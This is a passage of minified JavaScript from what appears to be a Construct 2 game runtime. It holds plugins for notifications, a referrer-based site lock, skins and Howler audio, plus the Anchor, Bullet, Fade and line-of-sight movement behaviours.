i=e.gl,s=this.resx,n=this.resy;e.present();e=i.createFramebuffer();i.bindFramebuffer(i.FRAMEBUFFER,e),i.framebufferTexture2D(i.FRAMEBUFFER,i.COLOR_ATTACHMENT0,i.TEXTURE_2D,this.texture,0);var r=s*n*4,o=new Uint8Array(r);i.readPixels(0,0,s,n,i.RGBA,i.UNSIGNED_BYTE,o);for(var a,h,c,l,u=0;u<r;u+=4)a=o[u]/255,h=o[u+1]/255,c=o[u+2]/255,l=o[u+3]/255,o[u]=a/l*255,o[u+1]=h/l*255,o[u+2]=c/l*255;i.bindFramebuffer(i.FRAMEBUFFER,null),i.deleteFramebuffer(e);i=document.createElement("canvas");i.width=s,i.height=n;e=i.getContext("2d"),n=e.createImageData(s,n);n.data.set(o),e.putImageData(n,0,0),t.set_string(i.toDataURL())}else t.set_string(this.canvas.toDataURL())},s.prototype.getresx=function(t){t.set_float(this.resx)},s.prototype.getresy=function(t){t.set_float(this.resy)},t.exps=new s}(),cr.plugins_.sirg_notifications=function(t){this.runtime=t},function(){var t=cr.plugins_.sirg_notifications.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(t){switch(t){case 0:return"top-right";case 1:return"top-left";case 2:return"bottom-left";case 3:return"bottom-right"}return"bottom-right"}function s(t){switch(t){case 0:return"slow";case 1:return"medium";case 2:return"fast"}return"slow"}function c(t){switch(t){case 0:return"";case 1:return"gritter-light";case 2:return"gritter-success";case 3:return"gritter-info";case 4:return"gritter-warning";case 5:return"gritter-error";case 6:return"gritter-red";case 7:return"gritter-yellow";case 8:return"gritter-blue";case 9:return"gritter-green"}return""}function n(){}function r(){}e.onCreate=function(){this.position=i(this.properties[0]),this.fade_in_speed=s(this.properties[1]),this.fade_out_speed=s(this.properties[2]),this.time=this.properties[3],this.max_number=this.properties[4],this.param_sticky=0===this.properties[5],this.param_style=this.properties[6],this.curr_tag="",jQuery.extend(jQuery.gritter.options,{position:this.position,fade_in_speed:this.fade_in_speed,fade_out_speed:this.fade_out_speed,time:this.time,max_to_display:this.max_number})},e.onDestroy=function(){},e.saveToJSON=function(){return{}},e.loadFromJSON=function(t){},e.draw=function(t){},e.drawGL=function(t){},n.prototype.OnNotificationClicked=function(t){return cr.equals_nocase(t,this.curr_tag)},t.cnds=new n,r.prototype.AddNotification=function(t,e,i,s,n,r){jQuery.gritter.add({title:t,text:e,image:i,sticky:s,time:r,class_name:c(n)})},r.prototype.DeleteAllNotifications=function(){jQuery.gritter.removeAll()},r.prototype.AddSimpleNotification=function(t,e,i){jQuery.gritter.add({title:t,text:e,image:i,sticky:this.param_sticky,class_name:c(this.param_style)})},r.prototype.AddNotificationClickable=function(t,e,i,s,n,r,o,a){var h=this;h.curr_tag=t,jQuery.gritter.add({title:e,text:i,image:s,sticky:n,time:o,class_name:"gritter-clickable gritter-id-"+t+" "+c(r),close_on_click:a}),jQuery(".gritter-id-"+t).click(function(){return h.runtime.trigger(cr.plugins_.sirg_notifications.prototype.cnds.OnNotificationClicked,h),!1})},r.prototype.SetPosition=function(t){this.position=i(t),jQuery.gritter.options.position=this.position},t.acts=new r,t.exps=new function(){}}(),cr.plugins_.skymen_minifunctioncallback=function(t){this.runtime=t},function(){var t=cr.plugins_.skymen_minifunctioncallback.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}e.onCreate=function(){},e.draw=function(t){},e.drawGL=function(t){},e.getArgs=function(t,e,i){if(""==t)return[];""==i&&(i="a");var s,n=t.split(e),r=i.split(e);if(n.length>r.length){s=n.length-r.length;for(var o=0;o<s;o++)r.push("a")}for(o=0;o<n.length;o++){var a=r[o].trim().charAt(0).toLowerCase();"s"!=a&&"a"!=a&&"n"!=a&&console.warn("The type of the given number doesn't exist. Please use Number, String or Any. Note that the type only needs to start with n, a or s, and is not case sensitive, so using a single letter is ok."),"n"==a&&(n[o]=parseFloat(n[o].trim()))}return n},t.cnds=new function(){},i.prototype.Callback=function(t,e,i,s){s=this.getArgs(i,e,s);c2_callFunction&&c2_callFunction(t,s)},t.acts=new i,s.prototype.Callback=function(t,e,i,s,n){var r=pushFuncStack();r.name=e.toLowerCase(),r.retVal=0,cr.clearArray(r.params),r.params=this.getArgs(s,i,n);n=this.runtime.trigger(cr.plugins_.Function.prototype.cnds.OnFunction,this,r.name);isInPreview&&!n&&console.warn("[Construct 2] Function object: expression Function.Call('"+e+"' ...) was used, but no event was triggered. Is the function call spelt incorrectly or no longer used?"),popFuncStack(),t.set_any(r.retVal)},t.exps=new s}(),cr.plugins_.skymen_siteLock=function(t){this.runtime=t},function(){var t=cr.plugins_.skymen_siteLock.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(t){for(var e,i,s="",n=-1;++n<t.length;)e=t.charCodeAt(n),i=n+1<t.length?t.charCodeAt(n+1):0,55296<=e&&e<=56319&&56320<=i&&i<=57343&&(e=65536+((1023&e)<<10)+(1023&i),n++),e<=127?s+=String.fromCharCode(e):e<=2047?s+=String.fromCharCode(192|e>>>6&31,128|63&e):e<=65535?s+=String.fromCharCode(224|e>>>12&15,128|e>>>6&63,128|63&e):e<=2097151&&(s+=String.fromCharCode(240|e>>>18&7,128|e>>>12&63,128|e>>>6&63,128|63&e));return s}function o(t){for(var e=Array(t.length>>2),i=0;i<e.length;i++)e[i]=0;for(i=0;i<8*t.length;i+=8)e[i>>5]|=(255&t.charCodeAt(i/8))<<i%32;return e}function a(t,e){t[e>>5]|=128<<e%32,t[14+(e+64>>>9<<4)]=e;for(var i=1732584193,s=-271733879,n=-1732584194,r=271733878,o=0;o<t.length;o+=16){var a=i,h=s,c=n,l=r,i=u(i,s,n,r,t[o+0],7,-680876936),r=u(r,i,s,n,t[o+1],12,-389564586),n=u(n,r,i,s,t[o+2],17,606105819),s=u(s,n,r,i,t[o+3],22,-1044525330);i=u(i,s,n,r,t[o+4],7,-176418897),r=u(r,i,s,n,t[o+5],12,1200080426),n=u(n,r,i,s,t[o+6],17,-1473231341),s=u(s,n,r,i,t[o+7],22,-45705983),i=u(i,s,n,r,t[o+8],7,1770035416),r=u(r,i,s,n,t[o+9],12,-1958414417),n=u(n,r,i,s,t[o+10],17,-42063),s=u(s,n,r,i,t[o+11],22,-1990404162),i=u(i,s,n,r,t[o+12],7,1804603682),r=u(r,i,s,n,t[o+13],12,-40341101),n=u(n,r,i,s,t[o+14],17,-1502002290),i=p(i,s=u(s,n,r,i,t[o+15],22,1236535329),n,r,t[o+1],5,-165796510),r=p(r,i,s,n,t[o+6],9,-1069501632),n=p(n,r,i,s,t[o+11],14,643717713),s=p(s,n,r,i,t[o+0],20,-373897302),i=p(i,s,n,r,t[o+5],5,-701558691),r=p(r,i,s,n,t[o+10],9,38016083),n=p(n,r,i,s,t[o+15],14,-660478335),s=p(s,n,r,i,t[o+4],20,-405537848),i=p(i,s,n,r,t[o+9],5,568446438),r=p(r,i,s,n,t[o+14],9,-1019803690),n=p(n,r,i,s,t[o+3],14,-187363961),s=p(s,n,r,i,t[o+8],20,1163531501),i=p(i,s,n,r,t[o+13],5,-1444681467),r=p(r,i,s,n,t[o+2],9,-51403784),n=p(n,r,i,s,t[o+7],14,1735328473),i=d(i,s=p(s,n,r,i,t[o+12],20,-1926607734),n,r,t[o+5],4,-378558),r=d(r,i,s,n,t[o+8],11,-2022574463),n=d(n,r,i,s,t[o+11],16,1839030562),s=d(s,n,r,i,t[o+14],23,-35309556),i=d(i,s,n,r,t[o+1],4,-1530992060),r=d(r,i,s,n,t[o+4],11,1272893353),n=d(n,r,i,s,t[o+7],16,-155497632),s=d(s,n,r,i,t[o+10],23,-1094730640),i=d(i,s,n,r,t[o+13],4,681279174),r=d(r,i,s,n,t[o+0],11,-358537222),n=d(n,r,i,s,t[o+3],16,-722521979),s=d(s,n,r,i,t[o+6],23,76029189),i=d(i,s,n,r,t[o+9],4,-640364487),r=d(r,i,s,n,t[o+12],11,-421815835),n=d(n,r,i,s,t[o+15],16,530742520),i=g(i,s=d(s,n,r,i,t[o+2],23,-995338651),n,r,t[o+0],6,-198630844),r=g(r,i,s,n,t[o+7],10,1126891415),n=g(n,r,i,s,t[o+14],15,-1416354905),s=g(s,n,r,i,t[o+5],21,-57434055),i=g(i,s,n,r,t[o+12],6,1700485571),r=g(r,i,s,n,t[o+3],10,-1894986606),n=g(n,r,i,s,t[o+10],15,-1051523),s=g(s,n,r,i,t[o+1],21,-2054922799),i=g(i,s,n,r,t[o+8],6,1873313359),r=g(r,i,s,n,t[o+15],10,-30611744),n=g(n,r,i,s,t[o+6],15,-1560198380),s=g(s,n,r,i,t[o+13],21,1309151649),i=g(i,s,n,r,t[o+4],6,-145523070),r=g(r,i,s,n,t[o+11],10,-1120210379),n=g(n,r,i,s,t[o+2],15,718787259),s=g(s,n,r,i,t[o+9],21,-343485551),i=f(i,a),s=f(s,h),n=f(n,c),r=f(r,l)}return Array(i,s,n,r)}function h(t,e,i,s,n,r){return f((r=f(f(e,t),f(s,r)))<<(n=n)|r>>>32-n,i)}function u(t,e,i,s,n,r,o){return h(e&i|~e&s,t,e,n,r,o)}function p(t,e,i,s,n,r,o){return h(e&s|i&~s,t,e,n,r,o)}function d(t,e,i,s,n,r,o){return h(e^i^s,t,e,n,r,o)}function g(t,e,i,s,n,r,o){return h(i^(e|~s),t,e,n,r,o)}function f(t,e){var i=(65535&t)+(65535&e);return(t>>16)+(e>>16)+(i>>16)<<16|65535&i}function s(){}e.onCreate=function(){this.sites=this.properties[0].split(" "),this.hash=0===this.properties[1],this.key=this.properties[2],this.order=0===this.properties[3]},e.SiteLock=function(){var t=this.key,e=this.getGameSite();if(this.hash&&this.order){for(var i=0;i<this.sites.length;i++){var s,n=this.sites[i],t=this.key+i;if(n===(s=this.hex_hmac_md5(t,e)))return!1}return!0}return this.hash?(s=this.hex_hmac_md5(t,e),!this.sites.includes(s)):!this.sites.includes(e)},e.hex_hmac_md5=function(t,e){return this.rstr2hex(function(t,e){var i=o(t);16<i.length&&(i=a(i,8*t.length));for(var s=Array(16),n=Array(16),r=0;r<16;r++)s[r]=909522486^i[r],n[r]=1549556828^i[r];e=a(s.concat(o(e)),512+8*e.length);return function(t){for(var e="",i=0;i<32*t.length;i+=8)e+=String.fromCharCode(t[i>>5]>>>i%32&255);return e}(a(n.concat(e),640))}(i(t),i(e)))},e.rstr2hex=function(t){try{this.hexcase}catch(t){this.hexcase=0}for(var e,i=this.hexcase?"0123456789ABCDEF":"0123456789abcdef",s="",n=0;n<t.length;n++)e=t.charCodeAt(n),s+=i.charAt(e>>>4&15)+i.charAt(15&e);return s},e.getGameSite=function(){try{return new URL(document.referrer).hostname}catch(t){return new URL(document.location).hostname}},s.prototype.SiteLock=function(){return this.SiteLock()},t.cnds=new s,t.acts=new function(){},t.exps=new function(){}}(),cr.plugins_.skymen_skinsCore=function(t){this.runtime=t},function(){var t=cr.plugins_.skymen_skinsCore.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){this.skins={},this.lastSkin,this.lastSubSkin,this.curSkin,this.curSubSkin,this.tag=this.properties[0],this.instances=[],this.init=!1,null==cr.SkymenSkinCore&&(cr.SkymenSkinCore={}),cr.SkymenSkinCore[this.tag]=this},e.draw=function(t){},e.drawGL=function(t){},e.addInstance=function(t){this.instances.push(t)},i.prototype.IsEmpty=function(){return 0===Object.keys(this.skins).length&&this.skins.constructor===Object},i.prototype.HasSkin=function(t){return null!=this.skins[t]},i.prototype.HasSubSkin=function(t,e){return null!=this.skins[t]&&null!=this.skins[t][e]},i.prototype.OnSkin=function(t){return t==this.lastSkin},i.prototype.OnSubSkin=function(t,e){return t==this.lastSkin&&e==this.lastSubskin},i.prototype.OnAnySkin=function(){return!0},i.prototype.OnAnySubSkin=function(t){return t==this.lastSkin},i.prototype.OnAnySubAnySkin=function(){return!0},e.doForEachTrigger=function(t){this.runtime.pushCopySol(t.solModifiers),t.retrigger(),this.runtime.popSol(t.solModifiers)},i.prototype.ForEachSkin=function(){var e=this.runtime.getCurrentEventStack().current_event;return self=this,Object.keys(this.skins).forEach(function(t){self.curSkin=t,self.doForEachTrigger(e)}),!1},i.prototype.ForEachSubSkin=function(t){var e=this.runtime.getCurrentEventStack().current_event;return null==(self=this).skins[t]||Object.keys(this.skins[t]).forEach(function(t){self.curSubSkin=t,self.doForEachTrigger(e)}),!1},t.cnds=new i,s.prototype.AddSkin=function(t,e,i,s,n){if(null==this.skins[e]&&(this.skins[e]={}),0==i)for(var r=0;r<t.animations.length;r++){s=t.animations[r].name;this.skins[e][s]={type:t,anim:s}}else this.skins[e][n]={type:t,anim:s}},s.prototype.AddSubSkin=function(t,e,i,s){null==this.skins[e]&&(this.skins[e]={}),this.skins[e][i]={type:t,anim:s}},s.prototype.RemoveSkin=function(t){null!=this.skins[t]&&delete this.skins[t]},s.prototype.RemoveSubSkin=function(t,e){null!=this.skins[t]&&null!=this.skins[t][e]&&delete this.skins[t][e]},s.prototype.Init=function(){if(!this.init){for(var t=0;t<this.instances.length;t++)this.instances[t].updateSkin();this.init=!0}},t.acts=new s,n.prototype.CurSkin=function(t){t.set_string(this.curSkin)},n.prototype.CurSubSkin=function(t){t.set_string(this.curSubSkin)},n.prototype.LastSkin=function(t){t.set_string(this.lastSkin)},n.prototype.LastSubSkin=function(t){t.set_string(this.lastSubSkin)},n.prototype.RandomSkin=function(t){var e=Object.keys(this.skins),e=e[e.length*Math.random()<<0];"string"==typeof e?t.set_string(e):t.set_string("")},n.prototype.RandomSubSkin=function(t,e){var i;this.skins[e]?"string"==typeof(i=(i=Object.keys(this.skins[e]))[i.length*Math.random()<<0])?t.set_string(i):t.set_string(""):(console.warn("The skin "+e+" doesn't exist"),t.set_string(""))},t.exps=new n}();var HowlerAudioPlayer=globalThis.HowlerAudioPlayer;cr.plugins_.skymenhowlerjs=function(t){this.runtime=t},function(){var t=cr.plugins_.skymenhowlerjs.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime,HowlerAudioPlayer.init(this.runtime)},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){},e.saveToJSON=function(){},e.loadFromJSON=function(t){},e.onDestroy=function(){},e.tick=function(){},e.draw=function(t){},e.drawGL=function(t){},i.prototype.IsPlaying=function(t){return""===t.trim()?HowlerAudioPlayer.isPlaying():HowlerAudioPlayer.isPlaying(t)},t.cnds=new i,s.prototype.Play=function(t,e){""===e.trim()?HowlerAudioPlayer.play(t[0]):HowlerAudioPlayer.play(t[0],e)},s.prototype.PlayByName=function(t,e){""===e.trim()?HowlerAudioPlayer.play(t):HowlerAudioPlayer.play(t,e)},s.prototype.Stop=function(t){""===t.trim()?HowlerAudioPlayer.stop():HowlerAudioPlayer.stop(t)},s.prototype.Mute=function(t){""===t.trim()?HowlerAudioPlayer.setMuted(!0):HowlerAudioPlayer.setMuted(!0,t)},s.prototype.Unmute=function(t){""===t.trim()?HowlerAudioPlayer.setMuted(!1):HowlerAudioPlayer.setMuted(!1,t)},s.prototype.Volume=function(t,e){""===e.trim()?HowlerAudioPlayer.setVolume(t):HowlerAudioPlayer.setVolume(t,e)},s.prototype.LinearVolume=function(t,e){""===e.trim()?HowlerAudioPlayer.setLinearVolume(t):HowlerAudioPlayer.setLinearVolume(t,e)},s.prototype.Load=function(t,e){""===e.trim()?HowlerAudioPlayer.load(t[0]):HowlerAudioPlayer.load(t[0],e)},s.prototype.Unload=function(t,e){""===e.trim()?HowlerAudioPlayer.unload(t[0]):HowlerAudioPlayer.unload(t[0],e)},s.prototype.LoadByName=function(t,e){""===e.trim()?HowlerAudioPlayer.load(t):HowlerAudioPlayer.load(t,e)},s.prototype.UnloadByName=function(t,e){""===e.trim()?HowlerAudioPlayer.unload(t):HowlerAudioPlayer.unload(t,e)},t.acts=new s,n.prototype.Volume=function(t,e){""===e.trim()?t.set_float(HowlerAudioPlayer.getVolume()):t.set_float(HowlerAudioPlayer.getVolume(e))},n.prototype.MasterVolume=function(t){t.set_float(HowlerAudioPlayer.getVolume(group))},n.prototype.LinearVolume=function(t,e){""===e.trim()?t.set_float(HowlerAudioPlayer.getLinearVolume()):t.set_float(HowlerAudioPlayer.getLinearVolume(e))},n.prototype.MasterVolume=function(t){t.set_float(HowlerAudioPlayer.getLinearVolume(group))},t.exps=new n}(),cr.behaviors.Anchor=function(t){this.runtime=t},function(){var t=cr.behaviors.Anchor.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}e.onCreate=function(){this.anch_left=this.properties[0],this.anch_top=this.properties[1],this.anch_right=this.properties[2],this.anch_bottom=this.properties[3],this.inst.update_bbox(),this.xleft=this.inst.bbox.left,this.ytop=this.inst.bbox.top,this.xright=this.runtime.original_width-this.inst.bbox.left,this.ybottom=this.runtime.original_height-this.inst.bbox.top,this.rdiff=this.runtime.original_width-this.inst.bbox.right,this.bdiff=this.runtime.original_height-this.inst.bbox.bottom,this.enabled=0!==this.properties[4]},e.saveToJSON=function(){return{xleft:this.xleft,ytop:this.ytop,xright:this.xright,ybottom:this.ybottom,rdiff:this.rdiff,bdiff:this.bdiff,enabled:this.enabled}},e.loadFromJSON=function(t){this.xleft=t.xleft,this.ytop=t.ytop,this.xright=t.xright,this.ybottom=t.ybottom,this.rdiff=t.rdiff,this.bdiff=t.bdiff,this.enabled=t.enabled},e.tick=function(){var t,e,i,s;this.enabled&&(e=this.inst.layer,i=this.inst,s=this.inst.bbox,0===this.anch_left?(i.update_bbox(),0!==(t=e.viewLeft+this.xleft-s.left)&&(i.x+=t,i.set_bbox_changed())):1===this.anch_left&&(i.update_bbox(),0!==(t=e.viewRight-this.xright-s.left)&&(i.x+=t,i.set_bbox_changed())),0===this.anch_top?(i.update_bbox(),0!==(t=e.viewTop+this.ytop-s.top)&&(i.y+=t,i.set_bbox_changed())):1===this.anch_top&&(i.update_bbox(),0!==(t=e.viewBottom-this.ybottom-s.top)&&(i.y+=t,i.set_bbox_changed())),1===this.anch_right&&(i.update_bbox(),0!==(t=e.viewRight-this.rdiff-s.right)&&(i.width+=t,i.width<0&&(i.width=0),i.set_bbox_changed())),1===this.anch_bottom&&(i.update_bbox(),0!==(t=e.viewBottom-this.bdiff-s.bottom)&&(i.height+=t,i.height<0&&(i.height=0),i.set_bbox_changed())))},t.cnds=new function(){},i.prototype.SetEnabled=function(t){this.enabled&&0===t?this.enabled=!1:this.enabled||0===t||(this.inst.update_bbox(),this.xleft=this.inst.bbox.left,this.ytop=this.inst.bbox.top,this.xright=this.runtime.original_width-this.inst.bbox.left,this.ybottom=this.runtime.original_height-this.inst.bbox.top,this.rdiff=this.runtime.original_width-this.inst.bbox.right,this.bdiff=this.runtime.original_height-this.inst.bbox.bottom,this.enabled=!0)},t.acts=new i,t.exps=new function(){}}(),cr.behaviors.Bullet=function(t){this.runtime=t},function(){var t=cr.behaviors.Bullet.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){var t=this.properties[0];this.acc=this.properties[1],this.g=this.properties[2],this.bounceOffSolid=0!==this.properties[3],this.setAngle=0!==this.properties[4],this.dx=Math.cos(this.inst.angle)*t,this.dy=Math.sin(this.inst.angle)*t,this.lastx=this.inst.x,this.lasty=this.inst.y,this.lastKnownAngle=this.inst.angle,this.travelled=0,this.enabled=0!==this.properties[5]},e.saveToJSON=function(){return{acc:this.acc,g:this.g,dx:this.dx,dy:this.dy,lx:this.lastx,ly:this.lasty,lka:this.lastKnownAngle,t:this.travelled,e:this.enabled}},e.loadFromJSON=function(t){this.acc=t.acc,this.g=t.g,this.dx=t.dx,this.dy=t.dy,this.lastx=t.lx,this.lasty=t.ly,this.lastKnownAngle=t.lka,this.travelled=t.t,this.enabled=t.e},e.tick=function(){var t,e,i,s;this.enabled&&(t=this.runtime.getDt(this.inst),this.inst.angle!==this.lastKnownAngle&&(this.setAngle&&(e=cr.distanceTo(0,0,this.dx,this.dy),this.dx=Math.cos(this.inst.angle)*e,this.dy=Math.sin(this.inst.angle)*e),this.lastKnownAngle=this.inst.angle),0!==this.acc&&(e=cr.distanceTo(0,0,this.dx,this.dy),i=0===this.dx&&0===this.dy?this.inst.angle:cr.angleTo(0,0,this.dx,this.dy),(e+=this.acc*t)<0&&(e=0),this.dx=Math.cos(i)*e,this.dy=Math.sin(i)*e),0!==this.g&&(this.dy+=this.g*t),this.lastx=this.inst.x,this.lasty=this.inst.y,0===this.dx&&0===this.dy||(this.inst.x+=this.dx*t,this.inst.y+=this.dy*t,this.travelled+=cr.distanceTo(0,0,this.dx*t,this.dy*t),this.setAngle&&(this.inst.angle=cr.angleTo(0,0,this.dx,this.dy),this.inst.set_bbox_changed(),this.lastKnownAngle=this.inst.angle),this.inst.set_bbox_changed(),this.bounceOffSolid&&(s=this.runtime.testOverlapSolid(this.inst))&&(this.runtime.registerCollision(this.inst,s),e=cr.distanceTo(0,0,this.dx,this.dy),s=this.runtime.calculateSolidBounceAngle(this.inst,this.lastx,this.lasty),this.dx=Math.cos(s)*e,this.dy=Math.sin(s)*e,this.inst.x+=this.dx*t,this.inst.y+=this.dy*t,this.inst.set_bbox_changed(),this.setAngle&&(this.inst.angle=s,this.lastKnownAngle=s,this.inst.set_bbox_changed()),this.runtime.pushOutSolid(this.inst,this.dx/e,this.dy/e,Math.max(2.5*e*t,30))||this.runtime.pushOutSolidNearest(this.inst,100))))},i.prototype.CompareSpeed=function(t,e){return cr.do_cmp(cr.distanceTo(0,0,this.dx,this.dy),t,e)},i.prototype.CompareTravelled=function(t,e){return cr.do_cmp(this.travelled,t,e)},t.cnds=new i,s.prototype.SetSpeed=function(t){var e=cr.angleTo(0,0,this.dx,this.dy);this.dx=Math.cos(e)*t,this.dy=Math.sin(e)*t},s.prototype.SetAcceleration=function(t){this.acc=t},s.prototype.SetGravity=function(t){this.g=t},s.prototype.SetAngleOfMotion=function(t){t=cr.to_radians(t);var e=cr.distanceTo(0,0,this.dx,this.dy);this.dx=Math.cos(t)*e,this.dy=Math.sin(t)*e},s.prototype.Bounce=function(t){var e,i,s;!t||(e=t.getFirstPicked(this.inst))&&(i=this.runtime.getDt(this.inst),s=cr.distanceTo(0,0,this.dx,this.dy),t=this.runtime.calculateSolidBounceAngle(this.inst,this.lastx,this.lasty,e),this.dx=Math.cos(t)*s,this.dy=Math.sin(t)*s,this.inst.x+=this.dx*i,this.inst.y+=this.dy*i,this.inst.set_bbox_changed(),this.setAngle&&(this.inst.angle=t,this.lastKnownAngle=t,this.inst.set_bbox_changed()),0!==s&&(this.bounceOffSolid?this.runtime.pushOutSolid(this.inst,this.dx/s,this.dy/s,Math.max(2.5*s*i,30))||this.runtime.pushOutSolidNearest(this.inst,100):this.runtime.pushOut(this.inst,this.dx/s,this.dy/s,Math.max(2.5*s*i,30),e)))},s.prototype.SetDistanceTravelled=function(t){this.travelled=t},s.prototype.SetEnabled=function(t){this.enabled=1===t},t.acts=new s,n.prototype.Speed=function(t){var e=cr.distanceTo(0,0,this.dx,this.dy),e=cr.round6dp(e);t.set_float(e)},n.prototype.Acceleration=function(t){t.set_float(this.acc)},n.prototype.AngleOfMotion=function(t){t.set_float(cr.to_degrees(cr.angleTo(0,0,this.dx,this.dy)))},n.prototype.DistanceTravelled=function(t){t.set_float(this.travelled)},n.prototype.Gravity=function(t){t.set_float(this.g)},t.exps=new n}(),cr.behaviors.Fade=function(t){this.runtime=t},function(){var t=cr.behaviors.Fade.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){this.activeAtStart=1===this.properties[0],this.setMaxOpacity=!1,this.fadeInTime=this.properties[1],this.waitTime=this.properties[2],this.fadeOutTime=this.properties[3],this.destroy=this.properties[4],this.stage=this.activeAtStart?0:3,this.recycled?this.stageTime.reset():this.stageTime=new cr.KahanAdder,this.maxOpacity=this.inst.opacity||1,this.activeAtStart&&(0===this.fadeInTime?(this.stage=1,0===this.waitTime&&(this.stage=2)):(this.inst.opacity=0,this.runtime.redraw=!0))},e.saveToJSON=function(){return{fit:this.fadeInTime,wt:this.waitTime,fot:this.fadeOutTime,s:this.stage,st:this.stageTime.sum,mo:this.maxOpacity}},e.loadFromJSON=function(t){this.fadeInTime=t.fit,this.waitTime=t.wt,this.fadeOutTime=t.fot,this.stage=t.s,this.stageTime.reset(),this.stageTime.sum=t.st,this.maxOpacity=t.mo},e.tick=function(){this.stageTime.add(this.runtime.getDt(this.inst)),0===this.stage&&(this.inst.opacity=this.stageTime.sum/this.fadeInTime*this.maxOpacity,this.runtime.redraw=!0,this.inst.opacity>=this.maxOpacity&&(this.inst.opacity=this.maxOpacity,this.stage=1,this.stageTime.reset(),this.runtime.trigger(cr.behaviors.Fade.prototype.cnds.OnFadeInEnd,this.inst))),1===this.stage&&this.stageTime.sum>=this.waitTime&&(this.stage=2,this.stageTime.reset(),this.runtime.trigger(cr.behaviors.Fade.prototype.cnds.OnWaitEnd,this.inst)),2===this.stage&&0!==this.fadeOutTime&&(this.inst.opacity=this.maxOpacity-this.stageTime.sum/this.fadeOutTime*this.maxOpacity,this.runtime.redraw=!0,this.inst.opacity<0&&(this.inst.opacity=0,this.stage=3,this.stageTime.reset(),this.runtime.trigger(cr.behaviors.Fade.prototype.cnds.OnFadeOutEnd,this.inst),1===this.destroy&&this.runtime.DestroyInstance(this.inst)))},e.doStart=function(){this.stage=0,this.stageTime.reset(),0===this.fadeInTime?(this.stage=1,0===this.waitTime&&(this.stage=2)):(this.inst.opacity=0,this.runtime.redraw=!0)},i.prototype.OnFadeOutEnd=function(){return!0},i.prototype.OnFadeInEnd=function(){return!0},i.prototype.OnWaitEnd=function(){return!0},t.cnds=new i,s.prototype.StartFade=function(){this.activeAtStart||this.setMaxOpacity||(this.maxOpacity=this.inst.opacity||1,this.setMaxOpacity=!0),3===this.stage&&this.doStart()},s.prototype.RestartFade=function(){this.doStart()},s.prototype.SetFadeInTime=function(t){t<0&&(t=0),this.fadeInTime=t},s.prototype.SetWaitTime=function(t){t<0&&(t=0),this.waitTime=t},s.prototype.SetFadeOutTime=function(t){t<0&&(t=0),this.fadeOutTime=t},t.acts=new s,n.prototype.FadeInTime=function(t){t.set_float(this.fadeInTime)},n.prototype.WaitTime=function(t){t.set_float(this.waitTime)},n.prototype.FadeOutTime=function(t){t.set_float(this.fadeOutTime)},t.exps=new n}(),cr.behaviors.LOS=function(t){this.runtime=t},function(){var t=cr.behaviors.LOS.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime};var e=t.Type.prototype;e.onCreate=function(){this.obstacleTypes=[]},e.findLosBehavior=function(t){for(var e,i=0,s=t.behavior_insts.length;i<s;++i)if((e=t.behavior_insts[i])instanceof cr.behaviors.LOS.prototype.Instance&&e.type===this)return e;return null},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime},(e=t.Instance.prototype).onCreate=function(){this.obstacleMode=this.properties[0],this.range=this.properties[1],this.cone=cr.to_radians(this.properties[2]),this.useCollisionCells=0!==this.properties[3]},e.onDestroy=function(){},e.saveToJSON=function(){for(var t={r:this.range,c:this.cone,t:[]},e=0,i=this.type.obstacleTypes.length;e<i;e++)t.t.push(this.type.obstacleTypes[e].sid);return t},e.loadFromJSON=function(t){var e,i,s;for(this.range=t.r,this.cone=t.c,cr.clearArray(this.type.obstacleTypes),e=0,i=t.t.length;e<i;e++)(s=this.runtime.getObjectTypeBySid(t.t[e]))&&this.type.obstacleTypes.push(s)},e.tick=function(){};var c=[],l=new cr.rect(0,0,0,0);function i(){}e.hasLOSto=function(t,e){var i=this.inst.x,s=this.inst.y,n=this.inst.angle;if(this.inst.width<0&&(n+=Math.PI),cr.distanceTo(i,s,t,e)>this.range)return!1;var r,o,a,h=cr.angleTo(i,s,t,e);if(cr.angleDiff(n,h)>this.cone/2)return!1;if(l.set(i,s,t,e),l.normalize(),0===this.obstacleMode){for(this.useCollisionCells?this.runtime.getSolidCollisionCandidates(this.inst.layer,l,c):(h=this.runtime.getSolidBehavior())&&cr.appendArray(c,h.my_instances.valuesRef()),r=0,o=c.length;r<o;++r)if(a=c[r],a.extra.solidEnabled&&a!==this.inst&&this.runtime.testSegmentOverlap(i,s,t,e,a))return cr.clearArray(c),!1}else{if(this.useCollisionCells)this.runtime.getTypesCollisionCandidates(this.inst.layer,this.type.obstacleTypes,l,c);else for(r=0,o=this.type.obstacleTypes.length;r<o;++r)cr.appendArray(c,this.type.obstacleTypes[r].instances);for(r=0,o=c.length;r<o;++r)if(a=c[r],a!==this.inst&&this.runtime.testSegmentOverlap(i,s,t,e,a))return 